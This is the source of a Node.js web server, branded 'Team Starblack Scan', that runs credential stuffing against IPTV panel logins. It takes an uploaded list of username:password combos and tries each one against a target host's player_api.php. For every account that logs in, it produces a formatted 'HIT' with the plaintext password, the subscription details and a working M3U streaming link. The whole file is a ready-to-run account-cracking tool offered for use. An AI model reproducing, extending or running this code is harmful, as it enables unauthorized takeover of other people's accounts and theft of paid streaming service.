const express = require('express');
const multer = require('multer');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Configurar multer para archivos
const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 10 * 1024 * 1024 }
});

// Mapeo de timezone
const timezoneToCountryCode = {
    "Europe/Madrid": "ES", "Europe/London": "GB", "America/New_York": "US",
    "America/Mexico_City": "MX", "America/Argentina/Buenos_Aires": "AR",
    "America/Sao_Paulo": "BR", "Europe/Paris": "FR", "Europe/Berlin": "DE",
    "Europe/Rome": "IT", "Europe/Athens": "GR", "Asia/Dubai": "AE",
    "Asia/Tokyo": "JP", "Asia/Shanghai": "CN", "Asia/Kolkata": "IN"
};

function getFlagFromTimezone(timezone) {
    if (!timezone) return { flag: "❓", code: "N/A" };
    const countryCode = timezoneToCountryCode[timezone];
    if (!countryCode) return { flag: "❓", code: "N/A" };
    const flag = countryCode.toUpperCase().split("").map(char => 
        String.fromCodePoint(char.charCodeAt(0) + 127397)).join("");
    return { flag, code: countryCode };
}

function limparHost(host) {
    return host.replace(/^https?:\/\//i, "").trim();
}

async function fetchComTimeout(resource, options = {}) {
    const { timeout = 10000 } = options;
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);
    try {
        const response = await fetch(resource, { ...options, signal: controller.signal });
        clearTimeout(id);
        return response;
    } catch (e) {
        clearTimeout(id);
        throw e;
    }
}

function formatCreatedDate(unix) {
    if (!unix || isNaN(unix) || unix == 0) return 'None';
    const d = new Date(unix * 1000);
    return d.toLocaleDateString('es-ES');
}

async function getRealUserData(host, user, pass) {
    const baseUrl = `http://${host}/player_api.php?username=${user}&password=${pass}`;
    try {
        console.log(`🔍 Probando: ${user}:${pass}`);
        
        const response = await fetchComTimeout(baseUrl);
        if (!response.ok) {
            console.log(`❌ HTTP ${response.status}: ${user}`);
            return null;
        }
        
        const data = await response.json();
        
        if (!data.user_info || data.user_info.auth !== 1) {
            console.log(`❌ Auth falló: ${user}`);
            return null;
        }
        
        console.log(`✅ HIT encontrado: ${user}`);
        
        return {
            username: data.user_info.username,
            status: data.user_info.status,
            exp_date: data.user_info.exp_date,
            is_trial: data.user_info.is_trial,
            active_cons: data.user_info.active_cons,
            max_connections: data.user_info.max_connections,
            created_at: data.user_info.created_at,
            message: data.user_info.message,
            live_streams_count: data.user_info.live_streams_count || 0,
            vod_streams_count: data.user_info.vod_streams_count || 0,
            series_count: data.user_info.series_count || 0,
            server_info: data.server_info || { url: host, port: 80 }
        };
        
    } catch (error) {
        console.log(`❌ Error ${user}: ${error.message}`);
        return null;
    }
}

function formatarHit(info, host, user, pass, nick, emojis) {
    const realServerUrl = info.server_info ? `http://${info.server_info.url}:${info.server_info.port}` : `http://${host}`;
    const expDate = info.exp_date && info.exp_date > 0 ? new Date(info.exp_date * 1000).toLocaleDateString('es-ES') : 'UNLIMITED';
    
    return `
━━━━━━━━━━━━━━━━━━━━
${emojis.emojiHeader} Team Starblack Scan ${emojis.emojiHeader}
━━━━━━━━━━━━━━━━━━━━
${emojis.servidor} HOST ➠ http://${host}
${emojis.emojiRealServer} REAL SERVER ➠ ${realServerUrl}
${emojis.criada} CREADA ➠ ${formatCreatedDate(info.created_at)}
${emojis.expira} EXPIRA ➠ ${expDate}
${emojis.usuario} USUARIO ➠ ${user}
${emojis.senha} CONTRASEÑA ➠ ${pass}
${emojis.status} ESTADO ➠ ${info.status || 'ACTIVE'}
${emojis.conexoes} MAX CONEXIONES ➠ ${info.max_connections || 'N/A'}
${emojis.conectados} CONEXIONES ACTIVAS ➠ ${info.active_cons || 0}
${emojis.hitsPor} HIT BY ➠ ${nick}
━━━━━━━━━━━━━━━━━━━━
${emojis.linkM3U} LINK M3U ➠ http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus
━━━━━━━━━━━━━━━━━━━━
📺 CANALES ➠ ${info.live_streams_count || 0}
🎬 PELICULAS ➠ ${info.vod_streams_count || 0}
🎞️ SERIES ➠ ${info.series_count || 0}
━━━━━━━━━━━━━━━━━━━━
📆 FECHA ➠ ${new Date().toLocaleDateString('es-ES')}
⌨️ BY ➠ @hacker056
━━━━━━━━━━━━━━━━━━━━
`;
}

// Endpoint principal para escanear
app.post('/api/scan', upload.single('comboFile'), async (req, res) => {
    console.log('📡 Recibida petición de escaneo');
    
    try {
        // Verificar que llegó el archivo
        if (!req.file) {
            console.log('❌ No se recibió archivo');
            return res.status(400).json({ success: false, error: 'No se recibió el archivo de combos' });
        }
        
        const host = req.body.host;
        const nick = req.body.nick || '@hacker056';
        const numBots = parseInt(req.body.numBots) || 10;
        
        // Parsear emojis
        let emojis = {
            emojiHeader: '★', hitsPor: '🎯', servidor: '🌐', usuario: '🤴',
            senha: '🔐', criada: '🗓️', expira: '📆', status: '🔋',
            linkM3U: '🔗', emojiRealServer: '📡', conectados: '👪', conexoes: '🧮'
        };
        
        if (req.body.emojis) {
            try {
                emojis = JSON.parse(req.body.emojis);
            } catch(e) {}
        }
        
        if (!host) {
            return res.status(400).json({ success: false, error: 'Host es requerido' });
        }
        
        // Leer combos del archivo
        const comboText = req.file.buffer.toString('utf-8');
        const combos = comboText.split(/\r?\n/).filter(line => {
            const trimmed = line.trim();
            return trimmed && trimmed.includes(':') && !trimmed.startsWith('#');
        });
        
        console.log(`📊 Host: ${host}`);
        console.log(`📊 Combos válidos: ${combos.length}`);
        console.log(`📊 Bots: ${numBots}`);
        
        if (combos.length === 0) {
            return res.status(400).json({ success: false, error: 'No se encontraron combos válidos en el archivo. Formato requerido: usuario:contraseña' });
        }
        
        const hits = [];
        let hitsCount = 0;
        let invalidCount = 0;
        let testedCount = 0;
        
        // Procesar combos secuencialmente para no sobrecargar
        for (let i = 0; i < combos.length; i++) {
            const combo = combos[i];
            const [user, pass] = combo.split(':');
            
            if (!user || !pass) {
                invalidCount++;
                testedCount++;
                continue;
            }
            
            const result = await getRealUserData(host, user, pass);
            
            if (result) {
                hitsCount++;
                const hitText = formatarHit(result, host, user, pass, nick, emojis);
                hits.push(hitText);
                console.log(`✅ HIT #${hitsCount}: ${user}`);
            } else {
                invalidCount++;
            }
            
            testedCount++;
            
            // Enviar progreso cada 10 combos
            if (i % 10 === 0) {
                console.log(`📈 Progreso: ${testedCount}/${combos.length} (Hits: ${hitsCount})`);
            }
        }
        
        console.log(`🎉 Escaneo completado! Hits: ${hitsCount}, Bad: ${invalidCount}`);
        
        res.json({
            success: true,
            hits: hits,
            stats: {
                total: combos.length,
                hits: hitsCount,
                invalidos: invalidCount,
                testados: testedCount
            }
        });
        
    } catch (error) {
        console.error('❌ Error en escaneo:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Endpoint para probar que el servidor funciona
app.get('/api/test', (req, res) => {
    res.json({ success: true, message: 'Servidor funcionando correctamente' });
});

app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

app.listen(port, () => {
    console.log(`✅ Servidor Team Starblack corriendo en puerto ${port}`);
    console.log(`🌐 Accede en http://localhost:${port}`);
});
